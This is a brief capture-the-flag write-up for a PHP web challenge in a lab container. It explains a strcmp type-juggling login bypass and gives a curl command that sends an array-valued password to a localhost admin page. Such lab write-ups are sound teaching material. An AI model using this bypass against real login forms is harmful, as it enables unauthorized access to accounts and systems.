# CTF 2: Web PHP

This uses the container [HightechSec/web-ctf-container](https://github.com/HightechSec/web-ctf-container/tree/master

## Challenges 1
Use [PHP Strcmp](https://www.php.net/manual/en/function.strcmp.php) bypass.
This can be done by using the `?password[]=%22%22`.
Due to some inherent weaknesses in PHP's comparisons, NULL == 0 will return true.

```sh
curl -X POST "http://127.0.0.1/admin/index.php?username=admin&password[]=%22%22&submit=Login"
```
